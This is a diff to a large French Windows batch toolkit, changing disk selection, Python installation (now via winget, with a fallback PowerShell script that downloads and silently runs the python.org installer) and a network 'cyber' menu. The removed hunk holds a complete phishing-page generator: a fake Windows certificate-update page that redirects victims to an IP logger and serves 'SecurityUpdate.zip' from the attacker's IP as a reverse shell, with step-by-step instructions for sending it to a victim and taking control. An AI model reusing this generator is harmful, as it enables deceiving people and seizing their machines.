@@ -1196,13 +1196,14 @@ if "%res%"=="0" goto menu_principal
 
 rem Recuperer le numero du disque a partir du choix
 set /a idx=1
+set "_disk_found=0"
 set "disk_num="
 for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | Select-Object -ExpandProperty Number"') do (
-    if !idx! equ %res% set "disk_num=%%D"
+    if !idx! equ %res% ( set "disk_num=%%D" & set "_disk_found=1" )
     set /a idx+=1
 )
 
-if not defined disk_num goto disk_manager
+if "!_disk_found!"=="0" goto disk_manager
 
 :disk_format_choice
 set "opts=NTFS (Windows);FAT32 (Compatibilite);exFAT (Compatibilite + Gros fichiers);ReFS (Windows Server)"
@@ -2810,21 +2811,27 @@ if defined PYCMD (
 )
 if defined PYCMD goto :eof
 echo.
-echo  [!] Python introuvable - Installation automatique...
+echo  [!] Python introuvable - Installation automatique via winget...
 echo.
-set "PY_PS=%TEMP%\py_inst_%RANDOM%.ps1"
-> "!PY_PS!" echo $inst = "$env:TEMP\py_setup.exe"
->> "!PY_PS!" echo $url  = 'https://www.python.org/ftp/python/3.12.10/python-3.12.10-amd64.exe'
->> "!PY_PS!" echo $ProgressPreference = 'Continue'
->> "!PY_PS!" echo Write-Host '  [~] Telechargement Python 3.12.10 (~27 MB)...' -ForegroundColor Cyan
->> "!PY_PS!" echo Invoke-WebRequest $url -OutFile $inst
->> "!PY_PS!" echo Write-Host ''
->> "!PY_PS!" echo Write-Host '  [~] Installation silencieuse en cours...' -ForegroundColor Cyan
->> "!PY_PS!" echo Start-Process $inst -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_test=0' -Wait
->> "!PY_PS!" echo Remove-Item $inst -Force -ErrorAction SilentlyContinue
->> "!PY_PS!" echo Write-Host '  [OK] Python 3.12 installe.' -ForegroundColor Green
-powershell -NoProfile -ExecutionPolicy Bypass -File "!PY_PS!"
-del /f /q "!PY_PS!" 2>nul
+winget install --id Python.Python.3.12 --accept-package-agreements --accept-source-agreements -e >nul 2>&1
+if !errorlevel! neq 0 (
+    echo  [!] winget indisponible - tentative via Python.org...
+    set "PY_PS=%TEMP%\py_inst_%RANDOM%.ps1"
+    > "!PY_PS!" echo $ProgressPreference='SilentlyContinue'
+    >> "!PY_PS!" echo $api = Invoke-RestMethod 'https://endoflife.date/api/python.json' -EA Stop
+    >> "!PY_PS!" echo $ver = ($api ^| Where-Object { $_.eol -eq $false } ^| Select-Object -First 1).latest
+    >> "!PY_PS!" echo if (-not $ver) { $ver = '3.12.10' }
+    >> "!PY_PS!" echo $url = "https://www.python.org/ftp/python/$ver/python-$ver-amd64.exe"
+    >> "!PY_PS!" echo Write-Host "  [~] Telechargement Python $ver..." -ForegroundColor Cyan
+    >> "!PY_PS!" echo $inst = "$env:TEMP\py_setup.exe"
+    >> "!PY_PS!" echo Invoke-WebRequest $url -OutFile $inst
+    >> "!PY_PS!" echo Write-Host '  [~] Installation silencieuse...' -ForegroundColor Cyan
+    >> "!PY_PS!" echo Start-Process $inst -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_test=0' -Wait
+    >> "!PY_PS!" echo Remove-Item $inst -Force -EA SilentlyContinue
+    >> "!PY_PS!" echo Write-Host '  [OK] Python installe.' -ForegroundColor Green
+    powershell -NoProfile -ExecutionPolicy Bypass -File "!PY_PS!"
+    del /f /q "!PY_PS!" 2>nul
+)
 for /f "delims=" %%p in ('where /r "%LOCALAPPDATA%\Programs\Python" python.exe 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
 for /f "delims=" %%p in ('where python 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
 if not defined PYCMD set "PYERR=1"
@@ -4475,45 +4482,6 @@ pause
 if defined _net_back goto %_net_back%
 goto net_cyber_menu
 
-:cyber_phishing_gen
-cls
-echo.
-echo  ================================================
-echo   GENERATEUR DE LIEN DE PHISHING (REMOTE)
-echo  ================================================
-echo.
-set /p "webhook=URL de votre IP Logger (ex: Grabify) : "
-if not defined webhook goto net_cyber_menu
-set /p "my_ip=Votre IP Publique (pour le retour shell) : "
-if not defined my_ip goto net_cyber_menu
-echo.
-echo [i] Generation de la page index_phishing.html...
-
-(
-echo ^<!DOCTYPE html^>
-echo ^<html^>^<head^>^<title^>Mise a jour systeme requise^</title^>^<script^>
-echo window.location.href = "%webhook%";
-echo ^</script^>^</head^>
-echo ^<body style="font-family:sans-serif; text-align:center;"^>
-echo ^<h1^>Verification de securite Windows^</h1^>
-echo ^<p^>Votre navigateur nécessite une mise à jour des certificats pour continuer.^</p^>
-echo ^<button onclick="downloadPayload()"^>Mettre a jour maintenant^</button^>
-echo ^<script^>
-echo function downloadPayload() {
-echo   // Ici on simule le lien vers ton script de Reverse Shell
-echo   window.location.href = "http://%my_ip%/SecurityUpdate.zip";
-echo }
-echo ^</script^>^</body^>^</html^>
-) > "%SCRIPT_DIR%\index_phishing.html"
-
-echo.
-echo [OK] Fichier 'index_phishing.html' genere.
-echo [!] Instruction : 
-echo     1. Hebergez ce fichier sur un serveur (ou ton PC via Python).
-echo     2. Envoyez le lien de votre serveur a la victime.
-echo     3. Des qu'elle telecharge et lance le fichier, vous avez le controle.
-pause & goto net_cyber_menu
-
 REM ===================================================================
 REM              MENU CYBERSECURITE RESEAU - PAR ALEEXLEDEV
 REM ===================================================================
@@ -4606,7 +4574,7 @@ if "%rc_opt%"=="3" (
 )
 
 REM --- [4] Scan complet ---
-if "%rc_opt%"=="4" goto ig_remote_scan_process
+if "%rc_opt%"=="4" ( set "base_ip=!remote_ip!" & goto start_lan_scan )
 
 if "%rc_opt%"=="5" goto cyber_ip_grabber
 goto cyber_remote_menu
